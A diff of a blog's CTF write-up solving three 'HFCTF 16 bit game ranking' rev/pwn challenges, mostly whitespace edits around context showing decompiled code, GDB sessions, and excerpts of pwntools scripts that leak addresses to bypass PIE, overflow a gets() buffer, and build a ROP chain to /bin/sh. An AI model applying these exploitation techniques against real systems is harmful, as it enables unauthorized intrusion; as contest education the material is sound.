@@ -4,8 +4,9 @@
 ]=-------------------=[  HFCTF Pwn 16 bit game ranking  ]=--------------------=[
 ]=----------------------------------------------------------------------------=[
 
-    > FYI, this writeup was made before revamping my site with this text based 
-      ascii look. There are more pictures than i'd like.
+
+  > FYI, this writeup was made before revamping my site with this text based 
+    ascii look. There are more pictures than i'd like.
 
 In this writeup I will be going over the 3 `16 bit game ranking` challenges made
 by salt. They are `rev` and `pwn` challenges. They are fairly easy but since in
@@ -17,6 +18,8 @@ The first part is a `rev` challenge worth 50 points
 The second part is a `pwn` challenge worth 100 points
 
 The last parth is a `pwn` challenge worth 300 points
+
+
 
 
         -------------------------=[  Part 1  ]=-------------------------        
@@ -51,7 +54,8 @@ function when passed the `0xdead` (`57005` in decimal) value.
 
 `admin` function decompiled:
 
-+-----------------------------~<] C Disassembly [>~-----------------------------+
+
++----------------------------~<] C Disassembly [>~-----------------------------+
 void admin(void)
 {
   int iVar1;
@@ -123,6 +127,7 @@ void admin(void)
 }
 +------------------------------------------------------------------------------+
 
+
 This function can clearly print a flag, so let's try that first.
 
 Let's run the executable and input `57005` to trigger the admin function.
@@ -133,7 +138,8 @@ Alright, now all we have to do is find the password.
 
 Looking at the `admin` decompiled code, this part is interesting:
 
-+-----------------------------~<] C Disassembly [>~-----------------------------+
+
++----------------------------~<] C Disassembly [>~-----------------------------+
   local_4c = 0;
   local_44 = 0;
   local_68 = 0;
@@ -152,6 +158,7 @@ Looking at the `admin` decompiled code, this part is interesting:
     local_10 = fopen("flag1.txt","r");
 +------------------------------------------------------------------------------+
 
+
 It compares the `local_68` and `local_78` buffers of `0x10` bytes, where 
 `local_68` is the hashed value from `local_4c`. 
 
@@ -164,10 +171,12 @@ being hashed. So all we have is to try to crack the `local_78` hash.
 Since `chal1` is little endian (LSB, see the file command screenshot), we need
 to swap endianness.
 
-+-----------------------------~<] C Disassembly [>~-----------------------------+
+
++----------------------------~<] C Disassembly [>~-----------------------------+
   local_78 = 0x4551207ed67005b4;
   local_70 = 0x4621e6068943f87f;
 +------------------------------------------------------------------------------+
+
 
 [~ cyberchef output - /public/pictures/2024-10-14/swap-endianness.png ~]
 
@@ -181,12 +190,15 @@ the first flag.
 [~ Flag 1 - /public/pictures/2024-10-14/flag1.png ~]
 
 
+
+
         -------------------------=[  Part 2  ]=-------------------------        
         
 
 After obtaining the first flag, this code is executed in the `admin` function:
 
-+-----------------------------~<] C Disassembly [>~-----------------------------+
+
++----------------------------~<] C Disassembly [>~-----------------------------+
 local_10 = fopen("flag1.txt","r");
 if (local_10 == (FILE *)0x0) {
     puts("ERROR! The flag cannot be read! Contact the designer!");
@@ -203,6 +215,7 @@ puts("NB: Your instruction will not be recorded for the moment.
       We will fix the problem one day!");
 +------------------------------------------------------------------------------+
 
+
 The `gets` function call does not check buffer size and can seemingly overflow.
 But since `PIE` is enabled, we can't directly use function addresses to overflow
 the `rip` register.
@@ -217,6 +230,7 @@ at which we overwrite the `rip` register.
 
 Let's first print a cyclic string to calculate the offset
 
+
 +-----------------------------~<] Python REPL [>~------------------------------+
 python
 import pwn
@@ -225,11 +239,13 @@ pwn.cyclic(150)
   aauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
 +------------------------------------------------------------------------------+
 
+
 Then let's open the executable in GDB, and print a cyclic string into the `gets`
 function. I used GDB Peda to add some functionality to GDB.
 
 Enter the `admin` function with `57005` and the `bubbles1` password, then print
 the cyclic string. The program should get a segmentation fault
+
 
 +-----------------------------~<] GDB session [>~------------------------------+
 gdb ./chal1
@@ -239,6 +255,7 @@ bubbles1
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
 uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
 +------------------------------------------------------------------------------+
+
 
 [~ SIGSEGV - /public/pictures/2024-10-14/sigsegv.png ~]
 
@@ -269,10 +286,12 @@ section of Ghidra, we'll use it to set a breakpoint in GDB:
 Now let's open GDB and `disass vote`, and set a breakpoint to the function 
 instruction offset. 
 
+
 +-----------------------------~<] GDB session [>~------------------------------+
 gdb ./chal1
 disass vote
 +------------------------------------------------------------------------------+
+
 
 In the output, we can find the corresponding address and instruction offset. We 
 are not using the address directly since it gets modified when executed for the 
@@ -282,10 +301,12 @@ first time with `PIE`.
 
 We add a breakpoint to it and run the program:
 
+
 +-----------------------------~<] GDB session [>~------------------------------+
 break *vote+381
 run
 +------------------------------------------------------------------------------+
+
 
 [~ vote execution with %p - /public/pictures/2024-10-14/vote_1.png ~]
 
@@ -337,11 +358,11 @@ Perfect now we can calculate the base address by calculating
 `0x5555555560c7 - 0x001020c7`, then we can add any other "static" address onto 
 it to redirect execution, effectively bypassing `PIE`. 
 
-
 Now we want to create a `pwntools` script that will automate this process for 
 us. It will first leak the address, then go back to the main menu, go to the 
 hidden menu, enter the password, then enter the calculated address of the `flag`
 function at the correct offset to redirect execution to print the flag.
+
 
 +--------------------------------~<] Python [>~--------------------------------+
 from pwn import *
@@ -385,10 +406,13 @@ p.sendlineafter(b'You\'re admin! We can trust you! Give us your instruction!',
 p.interactive()
 +------------------------------------------------------------------------------+
 
+
 Then execute it `python exploit2.py` (you would uncomment the remote part if it 
 was the actual challenge)
 
 [~ Flag 2 - /public/pictures/2024-10-14/second_flag.png ~]
+
+
 
 
         -------------------------=[  Part 3  ]=-------------------------        
@@ -425,7 +449,7 @@ string containing it is in Ghidra
 The beginning of the string is at `0x001037e8`, we simply have to calculate by 
 how much we should increment this value so that the string starts at `/bin/sh`
 
-[~ calculating the addr of binsh - /public/pictures/2024-10-14/calculating_binsh.png ~]
+[~ the addr of binsh - /public/pictures/2024-10-14/calculating_binsh.png ~]
 
 The `/bin/sh` string would then be at `0x00103806`
 
@@ -442,6 +466,7 @@ Now, using the leaked address from part two we can build the rop chain and call
 
 Here's the updated pwntools script, only the last section for the payload is 
 changed
+
 
 +--------------------------------~<] Python [>~--------------------------------+
 # ...
@@ -466,8 +491,10 @@ p.sendlineafter(b'You\'re admin! We can trust you! Give us your instruction!',
 p.interactive()
 +------------------------------------------------------------------------------+
 
+
 Running it gives a `/bin/sh` shell which we use to print the flag
 
 [~ Flag 3 - /public/pictures/2024-10-14/flag3.png ~]
 
 I really enjoyed this challenge, I hope to see pwn challenges again next year!
+
